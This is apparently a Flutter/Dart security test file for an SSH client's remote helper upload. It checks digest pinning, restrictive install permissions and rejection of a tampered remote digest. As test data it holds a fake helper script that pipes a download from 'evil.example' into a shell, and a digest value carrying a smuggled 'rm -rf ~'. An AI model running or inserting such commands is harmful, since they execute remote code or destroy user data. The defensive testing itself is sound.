@Tags(['security'])
library;

import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:dartssh2/dartssh2.dart';
import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:termphin/models/remote_agent_status.dart';
import 'package:termphin/services/ssh/remote_agent_service.dart';

/// The helper that lands on the user's server is the one that was built and
/// pinned, and nobody else on that server can swap it. It runs as the user
/// with their shell, so a substituted binary is a backdoor into every session.
///
/// `bundled_agent_assets_test.dart` checks the shipped files against the
/// manifest; this checks that the upload itself refuses anything else.
const _probe = 'home=/home/test\nos=Linux\narch=x86_64\nbinary=0\n';

/// Answers the probe, records every command, and has no SFTP - the upload
/// stops there, which is past everything this file is about.
class _RecordingClient implements SSHClient {
  _RecordingClient({this.probe = _probe});

  final String probe;
  final commands = <String>[];

  @override
  bool get isClosed => false;

  @override
  Future<SSHRunResult> runWithResult(
    String command, {
    bool runInPty = false,
    bool stdout = true,
    bool stderr = true,
    Map<String, String>? environment,
  }) async {
    commands.add(command);
    return SSHRunResult(
      output: Uint8List(0),
      stdout: Uint8List.fromList(utf8.encode(probe)),
      stderr: Uint8List(0),
      exitCode: 0,
      exitSignal: null,
    );
  }

  @override
  dynamic noSuchMethod(Invocation invocation) => super.noSuchMethod(invocation);
}

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  final messenger =
      TestDefaultBinaryMessengerBinding.instance.defaultBinaryMessenger;

  /// Serves the real assets, except the Linux x86_64 helper, which is swapped
  /// for [helper] - what a tampered build or a corrupted install would hold.
  void serveHelper(List<int> helper) {
    messenger.setMockMessageHandler('flutter/assets', (message) async {
      final key = Uri.decodeFull(utf8.decode(message!.buffer.asUint8List()));
      final bytes = key.endsWith('termphin-agent-x86_64.gz')
          ? gzip.encode(helper)
          : File(key).readAsBytesSync();
      return ByteData.sublistView(Uint8List.fromList(bytes));
    });
  }

  tearDown(() => messenger.setMockMessageHandler('flutter/assets', null));

  test('a helper that fails its digest is never sent', () async {
    serveHelper(utf8.encode('#!/bin/sh\ncurl evil.example | sh\n'));
    final client = _RecordingClient();
    const service = RemoteAgentService();
    final status = await service.probe(client);
    client.commands.clear();

    await expectLater(
      service.install(client, current: status),
      throwsA(predicate((error) => error.toString().contains('SHA-256 check'))),
    );
    expect(client.commands, isEmpty, reason: 'nothing may touch the server');
  });

  test('the genuine helper passes, into a directory only the user can '
      'enter', () async {
    serveHelper(
      gzip.decode(
        File(
          'assets/termphin-agent/termphin-agent-x86_64.gz',
        ).readAsBytesSync(),
      ),
    );
    final client = _RecordingClient();
    const service = RemoteAgentService();
    final status = await service.probe(client);
    client.commands.clear();

    await expectLater(
      service.install(client, current: status),
      throwsA(anything),
    );

    expect(client.commands, hasLength(1));
    expect(client.commands.single, contains('umask 077'));
    expect(client.commands.single, contains('chmod 700'));
  });

  test('a remote digest that is not one is not trusted', () async {
    final client = _RecordingClient(
      probe:
          '${_probe.replaceFirst('binary=0', 'binary=1')}'
          'binary.version=0.12.0\nbinary.protocol=1\n'
          'meta.version=0.12.0\nmeta.protocol=1\n'
          'meta.sha256=bf473bb0e9d0b55e68e3c9fea3bf841c6f014713a8fdf26d35d81ebe71ae8297; rm -rf ~\n',
    );

    final status = await const RemoteAgentService().probe(client);

    expect(status.publicStatus.state, RemoteAgentState.repair);
    expect(status.publicStatus.remoteSha256, isNull);
  });
}
